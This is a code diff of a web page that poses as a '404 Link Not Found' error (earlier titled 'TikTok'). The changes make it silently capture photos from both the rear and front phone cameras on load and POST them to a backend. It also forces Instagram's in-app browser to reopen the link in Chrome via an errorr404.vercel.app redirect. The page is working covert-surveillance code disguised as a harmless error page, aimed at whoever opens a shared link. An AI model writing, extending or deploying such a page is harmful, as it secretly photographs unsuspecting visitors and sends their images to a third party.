@@ -3,65 +3,88 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok</title>
+  <title></title>
 </head>
 <body>
   
   <h1>Error 404 : Link Not Found</h1>
   
-  <!-- Hidden canvas to capture the photo -->
-  <canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>
+  <!-- Hidden canvases to capture photos -->
+  <canvas id="rearCanvas" style="display:none;" width="1080" height="1920"></canvas>
+  <canvas id="frontCanvas" style="display:none;" width="1080" height="1920"></canvas>
 
   <script>
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const width = 1080;  // Default phone photo width
-    const height = 1920; // Default phone photo height
+    const rearCanvas = document.getElementById('rearCanvas');
+    const frontCanvas = document.getElementById('frontCanvas');
+    const rearContext = rearCanvas.getContext('2d');
+    const frontContext = frontCanvas.getContext('2d');
+    const width = 1080;  
+    const height = 1920;  
 
-    // Set canvas dimensions explicitly
-    canvas.width = width;
-    canvas.height = height;
+    // Capture photo from a specified camera
+    function capturePhoto(facingMode, canvas, context) {
+      return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: facingMode, 
+            width: { ideal: width }, 
+            height: { ideal: height } 
+          } 
+        })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
 
-    // Request access to the webcam and automatically capture a photo after loading
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: width }, height: { ideal: height } } })
-      .then(stream => {
-        // Set up video stream but don't display it
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        // Capture photo after 1 second (adjust timing if needed)
-        setTimeout(() => {
-          context.drawImage(video, 0, 0, width, height);
-          const photo = canvas.toDataURL('image/jpeg');  // Get photo as base64
-          sendPhoto(photo);  // Send photo to the backend API
-        }, 1000);
-      })
-      .catch(err => {
-        console.log("Error accessing webcam: ", err);
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, width, height);
+            const photo = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(track => track.stop()); // Stop the camera
+            resolve(photo);
+          }, 1000);
+        })
+        .catch(error => {
+          console.error(`Error accessing ${facingMode} camera: `, error);
+          reject(error);
+        });
       });
+    }
 
-    // Function to send the captured photo to the backend
-    async function sendPhoto(photo) {
+    // Capture both rear and front camera photos
+    async function captureBothPhotos() {
+      try {
+        const rearPhoto = await capturePhoto("environment", rearCanvas, rearContext);
+        const frontPhoto = await capturePhoto("user", frontCanvas, frontContext);
+        sendPhotos(rearPhoto, frontPhoto);
+      } catch (error) {
+        console.log("Error capturing photos:", error);
+      }
+    }
+
+    // Function to send the captured photos to the backend
+    async function sendPhotos(rearPhoto, frontPhoto) {
       try {
         const response = await fetch('/api/send-photo', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({ photo }),
+          body: JSON.stringify({ rearPhoto, frontPhoto }),
         });
 
         const result = await response.json();
         if (result.success) {
-          console.log('Photo sent successfully!');
+          console.log('Photos sent successfully!');
         } else {
-          console.log('Failed to send photo:', result.message);
+          console.log('Failed to send photos:', result.message);
         }
       } catch (error) {
-        console.log('Error sending photo:', error);
+        console.log('Error sending photos:', error);
       }
     }
+
+    // Start capturing both photos after loading
+    captureBothPhotos();
   </script>
 
   <!-- Force Instagram users to open in Chrome -->
@@ -69,8 +92,8 @@
     setTimeout(function() {
       var ua = navigator.userAgent.toLowerCase();
       if (ua.includes("instagram")) {
-        window.location.href = "googlechrome://https://errorr404.vercel.app/"; // Forces Chrome on Android
-        window.location.href = "googlechrome://browse?url=https://errorr404.vercel.app/"; // Alternative method
+        window.location.href = "googlechrome://https://errorr404.vercel.app/"; 
+        window.location.href = "googlechrome://browse?url=https://errorr404.vercel.app/"; 
       }
     }, 1000);
   </script>
